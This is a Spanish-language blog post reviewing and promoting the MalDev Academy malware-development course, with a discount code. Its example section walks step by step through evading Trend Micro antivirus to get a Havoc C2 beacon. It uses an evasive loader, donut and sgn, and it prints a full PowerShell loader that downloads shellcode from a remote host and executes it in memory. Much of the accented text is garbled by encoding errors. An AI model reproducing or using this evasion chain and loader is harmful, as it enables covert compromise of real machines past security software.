---
id: "maldevacademy-malware-development-course-review"
title: "Malware Development Course Review - MalDev Academy"
author: "juan-antonio-gonzalez-mena"
publishedDate: 2024-10-09
updatedDate: 2024-10-09
image: "https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-0.webp"
description: "An谩lisis completo de MalDev Academy, la plataforma especializada en desarrollo de malware con m谩s de 140 m贸dulos, base de datos de c贸digo y Discord privado para aprender t茅cnicas de red teaming y evasi贸n de AV/EDR."
categories:
  - "certifications"
draft: false
featured: false
lang: "es"
---

Pues efectivamente la colaboraci贸n que hemos estado anunciando estas ultimas semanas no es ni m谩s ni menos que con MalDev Academy ヰ仇. Puede que algunos los conozc谩is, puede que otros no, en cualquier caso, vamos a ver quienes son y un ejemplo real de como podemos aplicar lo que aprendemos en MalDev. Si tu principal inter茅s es el red teaming, blue teaming, an谩lisis de malware o forense digital, esta es tu plataforma.

- [驴Qu茅 es MalDev Academy?](#qu茅-es-maldev-academy)
- [驴Qu茅 contiene?](#qu茅-contiene)
    - [Malware Development Course](#malware-development-course)
    - [Base de Datos](#base-de-datos)
- [Discord Privado](#discord-privado)
- [Ejemplo](#ejemplo)
- [隆Descuento exclusivo! コ](#descuento-exclusivo-コ)
- [Conclusi贸n](#conclusi贸n)

## 驴Qu茅 es MalDev Academy?

![Logo de MalDev Academy](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-1.avif)

MalDev Academy es una academia especializada en desarrollo de malware formada por tres profesionales muy reconocidos en el sector: [mr.d0x](https://x.com/mrd0x), [NUL0x4C](https://x.com/NUL0x4C) y [5pider](https://x.com/C5pider).

![Equipo de MalDev Academy](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-2.avif)

驴No te ha pasado alguna vez que a m谩s avanzas en un tema, menos informaci贸n o menos informaci贸n de calidad encuentras? Suele pasar mucho cuando buscas informaci贸n muy especializada o sobre un tema que no est谩 tan extendido.

Pues hasta hace no mucho, esto pasaba con el desarrollo de malware. Es un tema avanzado en el cual, aunque s铆 hab铆a informaci贸n, quiz谩s no era, por un lado, tan accesible para principiantes, y por otro, tan centralizada. MalDev viene no solo a solucionar estos problemas, sino tambi茅n a seguir aportando contenido t茅cnico complejo para que los m谩s avanzados puedan aprender. Vamos a ver c贸mo se estructura MalDev y qu茅 contiene.

## 驴Qu茅 contiene?

MalDev Academy b谩sicamente se divide en dos: [el curso](https://maldevacademy.com/syllabus) y la [base de datos](https://search.maldevacademy.com/updates). Vamos a ver de que trata cada una.

#### Malware Development Course

El curso es el principal contenido de la plataforma y est谩 basado en m贸dulos.

![Interfaz de los m贸dulos del curso](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-3.avif)

Actualmente te puedes encontrar +140 m贸dulos de todas las dificultades:

- Principiante

![M贸dulos para principiantes](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-4.avif)

- Intermedio

![M贸dulos intermedios](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-5.avif)

- Avanzado

![M贸dulos avanzados](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-6.avif)

Lo mejor es que no se limita a todo esto, sino que est谩n constantemente a帽adiendo nuevos m贸dulos y actualizaciones:

![Actualizaciones recientes de m贸dulos](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-7.avif)

En el propio [Syllabus de MalDev Academy](https://maldevacademy.com/syllabus) de la plataforma puedes observar la l铆nea de tiempo de lo que han ido metiendo desde que la plataforma saliera el a帽o pasado:

![L铆nea de tiempo del syllabus](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-8.avif)

![Contenido actualizado del syllabus](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-9.avif)

Si te fijas, no solo meten contenido nuevo, sino tambi茅n Challenges para que puedas poner a prueba lo que vas aprendiendo.

![Challenges disponibles en la plataforma](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-10.avif)

Los m贸dulos por dentro se ven de la siguiente manera:

![Vista interior de un m贸dulo](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-11.avif)

![Contenido detallado de un m贸dulo](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-12.avif)

Est谩 todo explicado siempre paso por paso y constantemente te facilitan todo, incluso te proporcionan una VM con todas las herramientas que necesitas:

![M谩quina virtual proporcionada por MalDev](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-13.avif)

#### Base de Datos

Adem谩s de la academia, MalDev ofrece otro servicio conocido como la base de datos. Este servicio ofrece Code Snippets (fragmentos de c贸digo) de acciones espec铆ficas. Por ejemplo, 驴quieres buscar maneras de dumpear el LSASS de manera r谩pida? Pues solo tienes que hacer una b煤squeda:

![B煤squeda en la base de datos](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-14.avif)

Y te proporcionar谩n los distintos c贸digos disponibles para ello en la base de datos:

![Resultados de b煤squeda de c贸digo](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-15.avif)

![Ejemplo de c贸digo snippet](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-16.avif)

El prop贸sito de este servicio al final es ahorrar tiempo a los desarrolladores y tener de manera centralizada una buena fuente de referencias de c贸digo para que puedan ser usadas r谩pidamente. Adem谩s, esta base de datos est谩 [actualiz谩ndose constantemente](https://search.maldevacademy.com/updates):

![Actualizaciones de la base de datos](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-17.avif)

No solo incluyen fragmentos de c贸digo para el desarrollo de malware, sino tambi茅n para la creaci贸n de herramientas que nos puedan ser 煤tiles para explotar vulnerabilidades o crear scripts que interact煤en con servicios:

![Herramientas y scripts disponibles](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-18.avif)

## Discord Privado

Aunque los dos principales servicios de MalDev sean la academia y la base de datos, una de las cosas que mas valoro es el Discord al que te dan acceso:

![Discord privado de MalDev Academy](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-19.avif)

El discord est谩 lleno de actividad y est谩n constantemente compartiendo t茅cnicas nuevas. Adem谩s, si preguntas cualquier duda te responder谩n sin problemas.

## Ejemplo

Vamos a probar a evadir el antivirus de [Trend Micro Maximum Security](https://www.trendmicro.com/es_es/forHome/products/maximum-security.html) con el objetivo de obtener un [beacon](https://cloud.google.com/blog/topics/threat-intelligence/defining-cobalt-strike-components) en nuestro C2.

> Esto es un ejemplo muy simplificado debido a que primeramente, estamos tratando con un AV y no un EDR. Adem谩s, de que la evasi贸n no se limita al momento de obtener un beacon, sino que se deben de tener en cuenta todas las acciones posteriores que puedan generar telemetr铆a que un AV/EDR puedan detectar.

![Trend Micro Maximum Security](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-20.avif)

![Interfaz del antivirus](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-21.avif)

Primero de todo nos conectaremos al C2 iniciando el cliente de [Havoc](https://github.com/HavocFramework/Havoc):

![Cliente de Havoc](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-22.avif)

![Conexi贸n al C2 establecida](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-23.avif)

Una vez estemos conectado vamos a configurar un Listener HTTPS:

![Configuraci贸n del Listener](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-24.avif)

![Listener HTTPS configurado](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-25.avif)

Con el Listener configurado, vamos a generar el Payload. Seleccionaremos el formato de Shellcode:

![Generaci贸n del payload en formato shellcode](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-26.avif)

Llegados este punto ya tenemos los preparativos b谩sicos hechos. En este ejemplo, haremos uso de un [loader](https://redcanary.com/blog/threat-detection/crypters-and-loaders/) que se explica en uno de los m贸dulos de MalDev Academy. Este loader posee las siguientes caracter铆sticas:
- Syscalls indirectos utilizando una implementaci贸n mejorada de [HellHall](https://github.com/Maldev-Academy/HellHall).
- Unhooking de Dll a trav茅s del directorio `\KnownDlls\` sin usar permisos de memoria RWX. (recupera las versiones originales sin hook de `ntdll.dll`, `kernel32.dll` y `kernelbase.dll`).
- Inyecci贸n de payload mediante segmentaci贸n, posiblemente evitando los filtros de eventos de EDR (divide el payload en varios fragmentos y los inyecta de manera gradual en memoria).
- Uso de una librer铆a personalizada de cifrado AES.
- Ejecuci贸n del payload mediante las [APIs del Thread Pool](https://learn.microsoft.com/en-us/windows/win32/procthread/thread-pool-api).
- Ofuscaci贸n del IAT utilizando hashing de API y camuflaje de API.
- Independiente de la librer铆a CRT.

![C贸digo del loader personalizado](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-27.avif)

Este loader se ayuda de otro programa llamado `PayloadEncrypter`. La funci贸n principal de este programa es leer un payload del disco, encriptarlo, y luego guardarlo para almacenarlo dentro de la secci贸n de recursos (`.rsrc section`) del loader.

Usaremos `PayloadEncrypter` con el payload generado por Havoc:

![Uso de PayloadEncrypter con el payload](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-28.avif)

Una vez cifrado lo colocaremos en la secci贸n de recursos (`.rsrc section`) del loader y compilaremos la herramienta:

![Compilaci贸n del loader](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-29.avif)

![Herramienta compilada exitosamente](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-30.avif)

En este momento ya tenemos una DLL maliciosa que ejecutar谩 el payload de Havoc y proporcionar谩 un beacon. Sin embargo, si lo dejamos tal cual est谩 es detectado por bastantes soluciones de seguridad:

![Detecci贸n inicial por soluciones de seguridad](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-31.avif)

Para intentar solucionarlo haremos uso de dos herramientas, la primera de ellas es [donut](https://github.com/TheWover/donut). Donut es una herramienta que permite la ejecuci贸n en memoria de archivos VBScript, JScript, EXE, DLL y ensamblados .NET. La usaremos para, a partir de la DLL que tenemos, generar un binario que se pueda cargar directamente en la memoria y ejecutar sin necesidad de escribir el archivo en el disco. En este caso, estamos generando un "shellcode" a partir de la DLL utilizando el comando mostrado en la siguiente imagen.

![Generaci贸n de shellcode con donut](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-32.avif)

Donut de manera por defecto utiliza t茅cnicas de ofuscaci贸n y puede incluir mecanismos para desactivar AMSI y WLDP (Windows Lockdown Policy), lo que permite evadir ciertos mecanismos de seguridad de Windows.

Sobre el archivo generado por donut utilizaremos otra herramienta, [sgn](https://github.com/EgeBalci/sgn). SGN es un encoder binario polim贸rfico dise帽ado para prop贸sitos de seguridad ofensiva, como la generaci贸n de payloads binarios indetectables de forma est谩tica. De hecho, seguro que _[Shikata ga nai](https://security.stackexchange.com/questions/130256/what-is-shikata-ga-nai)_ te suena, el famoso encoder de Metasploit. Pues este es una mejora de la implementaci贸n original, escrita en Golang.

Esta herramienta la descubr铆 en el servidor de MalDev:

![Descubrimiento de sgn en el servidor de MalDev](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-33.avif)

Sea lo que sea, la usaremos para a帽adir una capa adicional de ofuscaci贸n y polimorfismo al payload generado por Donut:

![Uso de sgn para ofuscar el payload](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-34.avif)

Esta herramienta proporciona el mismo formato de salida que Donut. Si ahora subimos este shellcode a VirusTotal:

![An谩lisis en VirusTotal con 0/60 detecciones](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-35.avif)

Podemos observar que ninguna soluci贸n lo detecta como malicioso, obteniendo una puntuaci贸n de detecci贸n de 0/60.

Llegados a este punto, tenemos un shellcode lo suficientemente modificado como para probarlo con Trend Micro. En este caso haremos uso de reflexi贸n para cargarlo en memoria. Esta t茅cnica consiste en asignar espacio en memoria y copiar el shellcode directamente en 茅l, sin escribir en el disco, resolviendo din谩micamente sus referencias y ejecut谩ndolo en tiempo de ejecuci贸n. La reflexi贸n permite inspeccionar, invocar y acceder a tipos de datos .NET. Por defecto, PowerShell proporciona acceso a las propiedades y m茅todos de acceso p煤blico, pero utilizando las API de reflexi贸n, puede acceder a las partes internas de los tipos en .NET.

```powershell
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$Shellcode = (New-Object System.Net.WebClient).DownloadData("http://192.168.10.10/agent.bin.sgn")

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $Shellcode.Length, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $lpMem, $Shellcode.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

Si en el equipo v铆ctima descargamos en memoria este archivo `.ps1`:

![Descarga del script PowerShell en memoria](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-36.avif)

![Ejecuci贸n del script](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-37.avif)

Nuestro shellcode se ejecutar谩 y recibiremos el beacon en nuestro C2:

![Beacon recibido en el C2](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-38.avif)

![Conexi贸n del beacon establecida](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-39.avif)

![Acceso al sistema comprometido](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-40.avif)

Obteniendo as铆 acceso al equipo sin importar la presencia de [Trend Micro Maximum Security](https://www.trendmicro.com/es_es/forHome/products/maximum-security.html).

## 隆Descuento exclusivo! コ

Nota 01/02/2025: El descuento ya no est谩 disponible : (, pero eso no significa que no pueda haber nuevos descuentos en el futuro, por lo que siguenos en las redes sociales para no perderte nada. 隆Un saludo!

MalDev ha confiado en Deep Hacking y nos ha proporcionado un c贸digo de descuento exclusivo para vosotros, pod茅is obtener un 10% de descuento usando el c贸digo `DEEPHACKING10` tanto en el plan [lifetime](https://maldevacademy.com/pricing) como en el [bundle](https://maldevacademy.com/pricing) (este 煤ltimo contiene el acceso a la base de datos).

Para hacer uso del c贸digo a la hora de la compra ten茅is que a帽adirlo aqu铆:

![Campo para a帽adir c贸digo de descuento](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-41.avif)

Una vez a帽adido se aplicar谩 el 10% de descuento para el plan que hay谩is elegido.

![Descuento aplicado correctamente](https://cdn.deephacking.tech/i/posts/maldevacademy-malware-development-course-review/maldevacademy-malware-development-course-review-42.avif)

## Conclusi贸n

Hoy en d铆a existen muchas plataformas de formaci贸n, por ejemplo, los cursos car铆simos de OffSec que, en proporci贸n a lo que cuestan y lo que te ense帽an, no valen para nada la pena. Sin embargo, en el otro lado, existen plataformas como MalDev que no solo cuestan una cuarta parte, sino que el valor que te proporcionan es much铆simo mayor. Recomiendo esta plataforma no solo porque la considero buena, sino porque yo mismo soy usuario de ella y estoy encantado con el contenido que ofrecen.
